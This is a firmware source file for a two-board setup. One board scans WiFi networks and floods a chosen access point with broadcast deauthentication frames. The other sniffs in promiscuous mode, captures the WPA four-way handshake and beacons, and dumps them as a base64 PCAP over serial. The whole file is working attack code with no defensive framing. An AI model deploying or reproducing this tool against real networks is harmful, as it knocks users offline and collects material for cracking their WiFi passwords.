/*
 * Unified Firmware for Controller and Sniffer Roles
 * 
 * Set boardRole to BOARD_ROLE_CONTROLLER on the board that will scan networks,
 * select a network, run deauth attack, and command the other board to sniff.
 *
 * Set boardRole to BOARD_ROLE_SNIFFER on the board that will wait on Serial1
 * for a sniff command from the controller and then run the sniff routine.
 *
 * Communication between boards is done over Serial1 (TX/RX must be cross‐wired
 * and a common ground connected). The controller uses the USB Serial (Serial)
 * for a text‐based menu.
 */

#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "wifi_constants.h"

#include <SPI.h>
#include <Wire.h>
#include <vector>
#include <map>
#include <cstring>
#include "debug.h"

// Global flag for the sniff callback
volatile bool sniffCallbackTriggered = false;

// Capture definitions
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

ManagementData capturedManagement;

// WiFi scanning result structure
struct WiFiScanResult {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

// Credentials and globals
char *ssid = "0x7359";
char *pass = "0123456789";
int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;
int scrollindex = 0;
int perdeauth = 3;

// Role definitions
#define BOARD_ROLE_CONTROLLER 0
#define BOARD_ROLE_SNIFFER 1
int boardRole = BOARD_ROLE_CONTROLLER; 

std::vector<uint8_t> generatePcapBuffer();

// ------------------------
// Helper Functions
// ------------------------

// Reset captured handshake and management data.
void resetCaptureData() {
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}

// Scan result callback – called for each discovered AP.
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[18];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", 
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// Scan WiFi networks (blocking call)
int scanNetworks() {
  Serial.println("Scanning WiFi Networks...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    Serial.println("Scan complete.");
    return 0;
  } else {
    Serial.println("Scan failed.");
    return 1;
  }
}

// ------------------------
// Sniff Callback and Routines
// ------------------------

// The sniff callback is invoked for every received packet.
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param) {
  sniffCallbackTriggered = true;
  
  unsigned int type, subtype;
  // Extract frame control field (first two bytes, little endian)
  unsigned short fc = packet[0] | (packet[1] << 8);
  type = (fc >> 2) & 0x03;
  subtype = (fc >> 4) & 0x0F;
  
  // Capture Management Frames (e.g., beacons)
  if (type == 0) {
    if (subtype == 8 || subtype == 5) { // Beacon or Probe Response
      if (capturedManagement.frameCount < MAX_MANAGEMENT_FRAMES) {
        ManagementFrame *mf = &capturedManagement.frames[capturedManagement.frameCount];
        mf->length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
        memcpy(mf->data, packet, mf->length);
        capturedManagement.frameCount++;
        Serial.print("Stored management frame count: ");
        Serial.println(capturedManagement.frameCount);
      }
    }
  }
  
  // Capture EAPOL (handshake) frames.
  const unsigned char eapol_sequence[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int seq_len = sizeof(eapol_sequence);
  bool isEAPOL = false;
  for (unsigned int i = 0; i <= length - seq_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < seq_len; j++) {
      if (packet[i + j] != eapol_sequence[j]) {
        match = false;
        break;
      }
    }
    if (match) { isEAPOL = true; break; }
  }
  
  if (isEAPOL) {
    Serial.println("EAPOL frame detected!");
    HandshakeFrame newFrame;
    newFrame.length = (length < MAX_FRAME_SIZE) ? length : MAX_FRAME_SIZE;
    memcpy(newFrame.data, packet, newFrame.length);
    
    // Extract the Sequence Control field (bytes 22–23)
    unsigned short seqControl = 0;
    if (newFrame.length >= 24) {
      seqControl = newFrame.data[22] | (newFrame.data[23] << 8);
    }
    
    // Find the EAPOL payload offset (by searching for the signature)
    unsigned int payloadOffset = 0;
    for (unsigned int i = 0; i <= newFrame.length - seq_len; i++) {
      bool match = true;
      for (unsigned int j = 0; j < seq_len; j++) {
        if (newFrame.data[i+j] != eapol_sequence[j]) {
          match = false;
          break;
        }
      }
      if (match) { payloadOffset = i; break; }
    }
    unsigned int newPayloadLength = (payloadOffset < newFrame.length) ? (newFrame.length - payloadOffset) : newFrame.length;
    
    bool duplicate = false;
    for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
      HandshakeFrame *stored = &capturedHandshake.frames[i];
      unsigned short storedSeq = 0;
      if (stored->length >= 24) {
        storedSeq = stored->data[22] | (stored->data[23] << 8);
      }
      unsigned int storedPayloadOffset = 0;
      for (unsigned int j = 0; j <= stored->length - seq_len; j++) {
        bool match = true;
        for (unsigned int k = 0; k < seq_len; k++) {
          if (stored->data[j+k] != eapol_sequence[k]) {
            match = false;
            break;
          }
        }
        if (match) { storedPayloadOffset = j; break; }
      }
      unsigned int storedPayloadLength = (storedPayloadOffset < stored->length) ? (stored->length - storedPayloadOffset) : stored->length;
      
      if (storedSeq == seqControl) {
        if (storedPayloadLength == newPayloadLength &&
            memcmp(stored->data + storedPayloadOffset, newFrame.data + payloadOffset, newPayloadLength) == 0) {
          duplicate = true;
          Serial.print("Duplicate handshake frame (seq 0x");
          Serial.print(seqControl, HEX);
          Serial.println(") detected, ignoring.");
          break;
        }
      }
    }
    
    if (!duplicate && capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES) {
      memcpy(capturedHandshake.frames[capturedHandshake.frameCount].data, newFrame.data, newFrame.length);
      capturedHandshake.frames[capturedHandshake.frameCount].length = newFrame.length;
      capturedHandshake.frameCount++;
      Serial.print("Stored handshake frame count: ");
      Serial.println(capturedHandshake.frameCount);
      if (capturedHandshake.frameCount == MAX_HANDSHAKE_FRAMES) {
        Serial.println("Complete handshake captured!");
      }
    }
  }
}

// Enable promiscuous (sniff) mode.
void enableSniffing() {
  Serial.println("Enabling sniffing mode...");
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  Serial.println("Sniffing mode enabled.");
}

// Disable promiscuous mode.
void disableSniffing() {
  Serial.println("Disabling sniffing mode...");
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  Serial.println("Sniffing mode disabled.");
}

// ------------------------
// Deauth Attack Routine
// ------------------------

// Runs a deauth attack on the currently selected network for a fixed duration.
void runDeauthAttack() {
  Serial.println("Starting deauth attack...");
  unsigned long startTime = millis();
  unsigned long duration = 30000; // 30 seconds
  while (millis() - startTime < duration) {
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    delay(100);
  }
  Serial1.print("DEAUTH_DONE");
  Serial.println("Deauth attack finished.");
}

// ------------------------
// Sniffing Routine (for Sniffer Board)
// ------------------------

// Starts sniffing on the specified channel via Serial control.
void startSniffingSerial(uint8_t channel) {
  Serial.print("Starting sniffing on channel ");
  Serial.println(channel);
  resetCaptureData();
  wext_set_channel(WLAN0_NAME, channel);
  Serial.print("Switched to channel: ");
  Serial.println(channel);
  enableSniffing();
  
  unsigned long sniffStart = millis();
  const unsigned long sniffTimeout = 60000; // 60 seconds timeout
  int lastCount = 0;
  Serial.println("Sniffing... (waiting for EAPOL frames)");
  
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES || capturedManagement.frameCount == 0) &&
         (millis() - sniffStart < sniffTimeout)) {

    // Check for "DEAUTH_DONE" command from the controller to stop sniffing early.
    if (Serial1.available()) {
      String cmd = Serial1.readStringUntil('\n');
      cmd.trim();
      if (cmd.equalsIgnoreCase("DEAUTH_DONE")) {
        Serial.println("Received DEAUTH_DONE signal. Stopping sniffing.");
        break;
      }
    }
    
    // Only print when a new EAPOL frame is captured.
    if (capturedHandshake.frameCount > lastCount) {
      lastCount = capturedHandshake.frameCount;
      Serial.print("EAPOL captured: ");
      Serial.print(capturedHandshake.frameCount);
      Serial.print("/");
      Serial.println(MAX_HANDSHAKE_FRAMES);
    }
    delay(100);
  }
  
  disableSniffing();
  
  if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES && capturedManagement.frameCount > 0) {
    Serial.println("Sniffing complete. Handshake captured.");
    printHandshakeData();
    sendPcapToSerial();
  } else {
    Serial.println("Sniffing timeout or incomplete handshake.");
  }
}

// ------------------------
// Board-to-Board Communication
// ------------------------

// On the controller board, send a sniff command to the sniffer board via Serial1.
void sendSniffCommandToSniffer(uint8_t channel) {
  Serial1.print("SNIFF ");
  Serial1.println(channel);
}

// On the sniffer board, process commands coming in via Serial1.
void processSnifferCommands() {
  if (Serial1.available()) {
    String cmd = Serial1.readStringUntil('\n');
    cmd.trim();
    if (cmd.startsWith("SNIFF")) {
      int spaceIndex = cmd.indexOf(' ');
      if (spaceIndex > 0) {
        String channelStr = cmd.substring(spaceIndex + 1);
        uint8_t channel = channelStr.toInt();
        Serial.print("Received SNIFF command with channel: ");
        Serial.println(channel);
        startSniffingSerial(channel);
        Serial1.println("SNIFF_DONE");
      }
    }
  }
}

// ------------------------
// Controller Command Menu (via Serial Monitor)
// ------------------------

// Processes commands entered from the PC over Serial.
// Modified processControllerCommands() function:
void processControllerCommands() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    // Create an uppercase copy for case-insensitive comparisons.
    String cmdUpper = cmd;
    cmdUpper.toUpperCase();
    
    if (cmdUpper.equals("HELP")) {
      Serial.println("Available commands:");
      Serial.println("SCAN - scan WiFi networks");
      Serial.println("LIST - list scanned networks (shows SSID, Channel, Frequency)");
      Serial.println("SELECT <index> - select network from list (index starting at 0)");
      Serial.println("ATTACK - run deauth attack on selected network");
      Serial.println("DEAUTH_SNIFF - run deauth attack and command sniffer board to sniff");
      Serial.println("PRINT_HANDSHAKE - print captured handshake data");
      Serial.println("SEND_PCAP - generate and send PCAP file in base64");
    } else if (cmdUpper.equals("SCAN")) {
      Serial.println("Disconnecting AP mode to switch to station mode for scanning...");
      WiFi.disconnect();  // Exit AP mode so that scanning will capture both 2.4G and 5G networks.
      delay(500);         // Wait briefly for the disconnection to complete.
      scan_results.clear();
      if (scanNetworks() == 0) {
        Serial.println("Scan complete.");
      } else {
        Serial.println("Scan failed.");
      }
      Serial.println("Restoring AP mode...");
      WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
    } else if (cmdUpper.equals("LIST")) {
      Serial.println("List of scanned networks:");
      for (size_t i = 0; i < scan_results.size(); i++) {
        Serial.print(i);
        Serial.print(": ");
        Serial.print(scan_results[i].ssid);
        Serial.print(" (");
        Serial.print((scan_results[i].channel >= 36) ? "5G" : "2.4G");
        Serial.print("), Ch: ");
        Serial.println(scan_results[i].channel);
      }
    } else if (cmdUpper.startsWith("SELECT")) {
      if (cmd.length() >= 6) {
        int spaceIndex = cmd.indexOf(' ');
        if (spaceIndex > 0) {
          String indexStr = cmd.substring(spaceIndex + 1);
          int idx = indexStr.toInt();
          if (idx >= 0 && idx < (int)scan_results.size()) {
            scrollindex = idx;
            SelectedSSID = scan_results[scrollindex].ssid;
            SSIDCh = (scan_results[scrollindex].channel >= 36) ? "5G" : "2.4G";
            Serial.print("Selected network: ");
            Serial.print(SelectedSSID);
            Serial.print(" (");
            Serial.print(SSIDCh);
            Serial.print(" ), Ch:");
            Serial.println(scan_results[scrollindex].channel);
          } else {
            Serial.println("Invalid index.");
          }
        } else {
          Serial.println("Usage: SELECT <index>");
        }
      }
    } else if (cmdUpper.equals("ATTACK")) {
      runDeauthAttack();
    } else if (cmdUpper.equals("DEAUTH_SNIFF")) {
      if (scan_results.size() > 0) {
        uint8_t channel = scan_results[scrollindex].channel;
        sendSniffCommandToSniffer(channel);
        runDeauthAttack();
      } else {
        Serial.println("No network selected. Please scan and select a network first.");
      }
    } else if (cmdUpper.equals("PRINT_HANDSHAKE")) {
      printHandshakeData();
    } else if (cmdUpper.equals("SEND_PCAP")) {
      sendPcapToSerial();
    } else {
      Serial.println("Unknown command. Type HELP for a list of commands.");
    }
  }
}

// ------------------------
// Utility Functions: Print Handshake and Send PCAP
// ------------------------

// Prints the captured handshake data over Serial.
void printHandshakeData() {
  Serial.println("---- Captured Handshake Data ----");
  Serial.print("Total handshake frames captured: ");
  Serial.println(capturedHandshake.frameCount);
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print("Frame ");
    Serial.print(i + 1);
    Serial.print(" (");
    Serial.print(hf.length);
    Serial.println(" bytes):");
    for (unsigned int j = 0; j < hf.length; j++) {
      if (j % 16 == 0) {
        Serial.println();
        Serial.print("0x");
        Serial.print(j, HEX);
        Serial.print(": ");
      }
      if (hf.data[j] < 16) {
        Serial.print("0");
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println("--------------------------------");
  }
  Serial.println("---- End of Handshake Data ----");
}

// Generates a PCAP file, encodes it in base64, and sends it over Serial.
void sendPcapToSerial() {
  Serial.println("Generating PCAP file...");
  std::vector<uint8_t> pcapBuffer = generatePcapBuffer();
  Serial.print("PCAP size: ");
  Serial.print(pcapBuffer.size());
  Serial.println(" bytes");
  
  const char* base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  String encoded = "";
  uint32_t i = 0;
  while (i < pcapBuffer.size()) {
    uint32_t octet_a = i < pcapBuffer.size() ? pcapBuffer[i++] : 0;
    uint32_t octet_b = i < pcapBuffer.size() ? pcapBuffer[i++] : 0;
    uint32_t octet_c = i < pcapBuffer.size() ? pcapBuffer[i++] : 0;
    uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
    encoded += base64Chars[(triple >> 18) & 0x3F];
    encoded += base64Chars[(triple >> 12) & 0x3F];
    encoded += (i - 1 < pcapBuffer.size()) ? base64Chars[(triple >> 6) & 0x3F] : '=';
    encoded += (i < pcapBuffer.size()) ? base64Chars[triple & 0x3F] : '=';
  }
  
  Serial.println("-----BEGIN PCAP BASE64-----");
  Serial.println(encoded);
  Serial.println("-----END PCAP BASE64-----");
}

// ------------------------
// Setup and Main Loop
// ------------------------
void setup() {
  // Initialize Serial (for PC) and Serial1 (for inter-board communication)
  Serial.begin(115200);
  Serial1.begin(115200);
  delay(1000);
  
  Serial.println("Initializing WiFi AP...");
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  
  if (boardRole == BOARD_ROLE_CONTROLLER) {
    // On controller, perform an initial scan and select the first network if available.
    scanNetworks();
    if (scan_results.size() > 0) {
      scrollindex = 0;
      SelectedSSID = scan_results[0].ssid;
      SSIDCh = (scan_results[0].channel >= 36) ? "5G" : "2.4G";
    }
    Serial.println("Controller ready. Type HELP for commands.");
  } else {
    Serial.println("Sniffer ready. Waiting for commands from controller on Serial1.");
  }
}

void loop() {
  if (boardRole == BOARD_ROLE_CONTROLLER) {
    processControllerCommands();
  } else if (boardRole == BOARD_ROLE_SNIFFER) {
    processSnifferCommands();
  }
}

// ------------------------
// Stub Implementation for generatePcapBuffer()
// ------------------------
//
// This function creates a minimal PCAP file with a global header,
// then appends each captured handshake frame as a record.
// For a more complete implementation, you would include proper timestamps
// and additional packet information.
std::vector<uint8_t> generatePcapBuffer() {
  std::vector<uint8_t> pcap;
  // Global header (24 bytes)
  uint8_t globalHeader[24] = {
    0xd4, 0xc3, 0xb2, 0xa1,  // Magic number
    0x02, 0x00,              // Version major = 2
    0x04, 0x00,              // Version minor = 4
    0x00, 0x00, 0x00, 0x00,  // Thiszone
    0x00, 0x00, 0x00, 0x00,  // Sigfigs
    0xff, 0xff, 0x00, 0x00,  // Snaplen (65535)
    0x01, 0x00, 0x00, 0x00   // Network (Ethernet)
  };
  pcap.insert(pcap.end(), globalHeader, globalHeader + 24);
  
  // Append each captured handshake frame as a record.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    // Record header (16 bytes): dummy timestamp (0,0), incl_len and orig_len.
    uint8_t recordHeader[16];
    memset(recordHeader, 0, sizeof(recordHeader));
    uint32_t incl_len = hf.length;
    uint32_t orig_len = hf.length;
    memcpy(&recordHeader[8], &incl_len, 4);
    memcpy(&recordHeader[12], &orig_len, 4);
    pcap.insert(pcap.end(), recordHeader, recordHeader + 16);
    pcap.insert(pcap.end(), hf.data, hf.data + hf.length);
  }
  return pcap;
}
